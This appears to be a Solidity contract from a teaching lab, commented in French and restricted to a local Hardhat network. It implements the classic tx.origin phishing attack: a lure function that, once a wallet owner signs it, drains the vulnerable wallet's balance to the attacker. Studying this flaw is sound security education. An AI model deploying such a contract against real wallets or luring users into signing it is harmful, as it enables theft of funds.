// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/// @dev Interface minimale commune a PortefeuilleVulnerable et PortefeuilleSecurise.
interface IPortefeuille {
    function transferer(address payable destinataire, uint256 montant) external;
}

/// @title Contrat piege exploitant tx.origin - usage pedagogique uniquement
/// @notice A utiliser exclusivement sur le reseau local Hardhat, contre les
///         contrats de ce laboratoire. Il simule un contrat d'apparence anodine
///         (ex. "reclamez votre recompense") vers lequel la victime est attiree.
contract AttaquantPhishing {
    IPortefeuille public immutable portefeuille; // portefeuille de la victime
    address payable public immutable attaquant;  // beneficiaire du vol

    constructor(address adressePortefeuille) {
        portefeuille = IPortefeuille(adressePortefeuille);
        attaquant = payable(msg.sender);
    }

    /// @notice Fonction "appat" : la victime croit reclamer une recompense.
    /// @dev Quand le proprietaire du portefeuille signe cette transaction :
    ///        - tx.origin  = proprietaire (il a signe) ;
    ///        - msg.sender vu par le portefeuille = ce contrat.
    ///      Un portefeuille qui verifie tx.origin accepte donc le transfert.
    function reclamerRecompense() external {
        portefeuille.transferer(attaquant, address(portefeuille).balance);
    }
}
